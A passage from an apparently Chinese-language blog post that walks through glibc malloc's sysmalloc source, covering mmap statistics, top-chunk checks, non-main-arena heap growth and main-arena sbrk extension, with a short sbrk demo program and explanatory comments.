correction) | IS_MMAPPED);<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    p = (mchunkptr) mm;<br>                    set_head (p, size | IS_MMAPPED);<br>                  &#125;<br><br>                <span class="hljs-comment">/* update statistics */</span><br>                <span class="hljs-comment">//下面这个部分就是更新mmap分配的数量，还有mmap分配的内存大小</span><br>                <span class="hljs-type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>                <span class="hljs-type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);<br><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>                sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;<br>                <span class="hljs-type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);<br><br>                check_chunk (av, p);<br><br>                <span class="hljs-keyword">return</span> chunk2mem (p);<br>              &#125;<br>          &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="一些中间操作"><a href="#一些中间操作" class="headerlink" title="一些中间操作"></a>一些中间操作</h5><p>主要是一些获取操作和一些判断条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* There are no usable arenas and mmap also failed.  */</span><br><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* Record incoming configuration of top */</span><br><br>old_top = av-&gt;top;<br>old_size = chunksize (old_top);<br>old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br><br>brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If not the first time through, we require old_size to be</span><br><span class="hljs-comment">  at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//这里就是两个条件，一个是没有初始化时，将unsorted当作假top，此时top_chunk size为0；</span><br><span class="hljs-comment">//正常后，要保证top chunk至少有MINSIZE并且前面的chunk在使用</span><br>assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>        prev_inuse (old_top) &amp;&amp;<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br><span class="hljs-comment">/* Precondition: not enough current space to satisfy nb request */</span><br>assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br></code></pre></td></tr></table></figure><h5 id="非主分配区分配"><a href="#非主分配区分配" class="headerlink" title="非主分配区分配"></a>非主分配区分配</h5><p>注意点：下面根据top chunk指针计算其heap头的地址，是因为heap本身是页对齐的，所以可以直接通过逻辑运算进行求得。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">heap_for_ptr</span>(ptr) <br>((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - <span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><p>下面是if-else分支的if分支，这个主要是用来处理非主分配区的分配</p><p>先看下大致流程：</p><p>首先就是尝试增长原heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>  &#123;<br>    <span class="hljs-comment">//非主分配区</span><br>    heap_info *old_heap, *heap;<br>    <span class="hljs-type">size_t</span> old_heap_size;<br><br>    <span class="hljs-comment">/* First try to extend the current heap. */</span><br>    old_heap = heap_for_ptr (old_top);<br>    old_heap_size = old_heap-&gt;size;<br>    <span class="hljs-comment">//如果heap空间不足，尝试增长heap</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span><br>        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>)<br>      &#123;<br>        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>        arena_mem += old_heap-&gt;size - old_heap_size;<br>        set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)<br>                  | PREV_INUSE);<br>      &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="hljs-keyword">sizeof</span> (*heap)), mp_.top_pad)))<br>      &#123;<br>        <span class="hljs-comment">//这里是使用新创建的一个heap</span><br>        <span class="hljs-comment">/* Use a newly allocated heap.  */</span><br>        heap-&gt;ar_ptr = av;<br>        heap-&gt;prev = old_heap;<br>        av-&gt;system_mem += heap-&gt;size;<br>        arena_mem += heap-&gt;size;<br>        <span class="hljs-comment">/* Set up the new top.  */</span><br>        <span class="hljs-comment">//新申请的堆的结构：</span><br>        <span class="hljs-comment">//heap：struct heap...| top chunk...</span><br>        top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span> (*heap));<br>        set_head (top (av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span> (*heap)) | PREV_INUSE);<br><br>        <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of</span><br><span class="hljs-comment">          MALLOC_ALIGNMENT in size. */</span><br>        <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might</span><br><span class="hljs-comment">          become the top chunk again later.  Note that a footer is set</span><br><span class="hljs-comment">          up, too, although the chunk is marked in use. */</span><br>        old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;<br>        set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);<br>        <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>          &#123;<br>            set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>            set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>            _int_free (av, old_top, <span class="hljs-number">1</span>);<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>            set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>      <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span><br>      <span class="hljs-keyword">goto</span> try_mmap;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="主分配区分配"><a href="#主分配区分配" class="headerlink" title="主分配区分配"></a>主分配区分配</h5><h6 id="关于sbrk"><a href="#关于sbrk" class="headerlink" title="关于sbrk"></a>关于sbrk</h6><p>这里插入一个关于sbrk的用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C">sbrk(<span class="hljs-number">0</span>)返回当前段结束地址#<span class="hljs-number">1</span><br>sbrk(<span class="hljs-number">4096</span>)返回增加后的起始地址#<span class="hljs-number">2</span><br>sbrk(<span class="hljs-number">0</span>)返回当前段结束地址#<span class="hljs-number">3</span><br>#<span class="hljs-number">1</span>的结果是原来的结束地址<br>#<span class="hljs-number">2</span>执行的结果是和#<span class="hljs-number">1</span>一致的，因为返回的是初始地址<br>#<span class="hljs-number">3</span>这个就是增加后的结束地址了<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-type">void</span> *p = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before:%p\n&quot;</span>, p);<br>    <br>    p = sbrk(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(4096):%p\n&quot;</span>, p);<br><br>    p = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(0)%p\n&quot;</span>, p);<br><br>    p = sbrk(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(4096)%p\n&quot;</span>, p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h6 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span><br><br><br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span><br>      size = nb + mp_.top_pad + MINSIZE;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If contiguous, we can subtract out existing space that we hope to</span><br><span class="hljs-comment">         combine with new space. We add it back later only if</span><br><span class="hljs-comment">         we don&#x27;t actually get contiguous space.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (contiguous (av))<br>        size -= old_size;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Round to a multiple of page size.</span><br><span class="hljs-comment">         If MORECORE is not contiguous, this ensures that we only call it</span><br><span class="hljs-comment">         with whole-page arguments.  And if MORECORE is contiguous and</span><br><span class="hljs-comment">         this is not first time through, this preserves page-alignment of</span><br><span class="hljs-comment">         previous calls. Otherwise, we correct to page-align below.</span><br><span class="hljs-comment">       */</span><br><br>      size = ALIGN_UP (size, pagesize);<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Don&#x27;t try to call MORECORE if argument is so big as to appear</span><br><span class="hljs-comment">         negative. Note that since mmap takes size_t arg, it may succeed</span><br><span class="hljs-comment">         below even if we cannot call MORECORE.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          brk = (<span class="hljs-type">char</span> *) (MORECORE (size));<br>          LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123;<br>          <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>          <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>          <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If have mmap, try using it as a backup when MORECORE fails or</span><br><span class="hljs-comment">             cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span><br><span class="hljs-comment">             address space, so sbrk cannot extend to give contiguous space, but</span><br><span class="hljs-comment">             space is available elsewhere.  Note that we ignore mmap max count</span><br><span class="hljs-comment">             and threshold limits, since the space will not be used as a</span><br><span class="hljs-comment">             segregated mmap region.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span><br>          <span class="hljs-keyword">if</span> (contiguous (av))<br>            size = ALIGN_UP (size + old_size, pagesize);<br><br>          <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>            size = MMAP_AS_MORECORE_SIZE;<br><br>          <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>              <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)<br>                &#123;<br>                  <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span><br>                  brk = mbrk;<br>                  snd_brk = brk + size;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     Record that we no longer have a contiguous sbrk region.</span><br><span class="hljs-comment">                     After the first time mmap is used as backup, we do not</span><br><span class="hljs-comment">                     ever rely on contiguous space since this could incorrectly</span><br><span class="hljs-comment">                     bridge regions.</span><br><span class="hljs-comment">                   */</span><br>                  set_noncontiguous (av);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>            mp_.sbrk_base = brk;<br>          av-&gt;system_mem += size;<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If MORECORE extends previous space, we can likewise extend top size.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>            set_head (old_top, (size + old_size) | PREV_INUSE);<br><br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<br>            &#123;<br>              <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span><br>              malloc_printerr (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>, brk,<br>       av);<br>            &#125;<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             Otherwise, make adjustments:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * If the first time through or noncontiguous, we need to call sbrk</span><br><span class="hljs-comment">              just to find out where the end of memory lies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * We need to ensure that all returned chunks from malloc will meet</span><br><span class="hljs-comment">              MALLOC_ALIGNMENT</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * If there was an intervening foreign sbrk, we need to adjust sbrk</span><br><span class="hljs-comment">              request size to account for fact that we will not be able to</span><br><span class="hljs-comment">              combine new space with existing space in old_top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * Almost all systems internally allocate whole pages at a time, in</span><br><span class="hljs-comment">              which case we might as well use the whole last page of request.</span><br><span class="hljs-comment">              So we allocate enough more memory to hit a page boundary now,</span><br><span class="hljs-comment">              which in turn causes future contiguous calls to page-align.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              front_misalign = <span class="hljs-number">0</span>;<br>              end_misalign = <span class="hljs-number">0</span>;<br>              correction = <span class="hljs-number">0</span>;<br>              aligned_brk = brk;<br><br>              <span class="hljs-comment">/* handle contiguous cases */</span><br>              <span class="hljs-keyword">if</span> (contiguous (av))<br>                &#123;<br>                  <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span><br>                  <span class="hljs-keyword">if</span> (old_size)<br>                    av-&gt;system_mem += brk - old_end;<br><br>                  <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span><br><br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                  <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                    &#123;<br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                         We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                         They will never be accessed anyway because</span><br><span class="hljs-comment">                         prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                         is always true after initialization.</span><br><span class="hljs-comment">                       */</span><br><br>                      correction = MALLOC_ALIGNMENT - front_misalign;<br>                      aligned_brk += correction;<br>                    &#125;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If this isn&#x27;t adjacent to existing space, then we will not</span><br><span class="hljs-comment">                     be able to merge with old_top space, so must add to 2nd request.</span><br><span class="hljs-comment">                   */</span><br><br>                  correction += old_size;<br><br>                  <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span><br>                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);<br>                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;<br><br>                  assert (correction &gt;= <span class="hljs-number">0</span>);<br>                  snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (correction));<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If can&#x27;t allocate correction, try to at least find out current</span><br><span class="hljs-comment">                     brk.  It might be enough to proceed without failing.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                     Note that if second sbrk did NOT fail, we assume that space</span><br><span class="hljs-comment">                     is contiguous with first sbrk. This is a safe assumption unless</span><br><span class="hljs-comment">                     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span><br><span class="hljs-comment">                     occurred between our first and second calls.</span><br><span class="hljs-comment">                   */</span><br><br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123;<br>                      correction = <span class="hljs-number">0</span>;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>                      <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>                      <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                        (*hook)();<br>                    &#125;<br>                &#125;<br><br>              <span class="hljs-comment">/* handle non-contiguous cases */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                    <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span><br>                    assert (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                      <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                        &#123;<br>                          <span class="hljs-comment">/*</span><br><span class="hljs-comment">                             Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                             We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                             They will never be accessed anyway because</span><br><span class="hljs-comment">                             prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                             is always true after initialization.</span><br><span class="hljs-comment">                           */</span><br><br>                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;<br>                        &#125;<br>                    &#125;<br><br>                  <span class="hljs-comment">/* Find out current end of memory */</span><br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                &#125;<br><br>              <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span><br>              <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                &#123;<br>                  av-&gt;top = (mchunkptr) aligned_brk;<br>                  set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>                  av-&gt;system_mem += correction;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If not the first time through, we either have a</span><br><span class="hljs-comment">                     gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="hljs-comment">                     double fencepost at old_top to prevent consolidation with space</span><br><span class="hljs-comment">                     we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="hljs-comment">                     marked as inuse and are in any case too small to use.  We need</span><br><span class="hljs-comment">                     two to make sizes and alignments work out.</span><br><span class="hljs-comment">                   */</span><br><br>                  <span class="hljs-keyword">if</span> 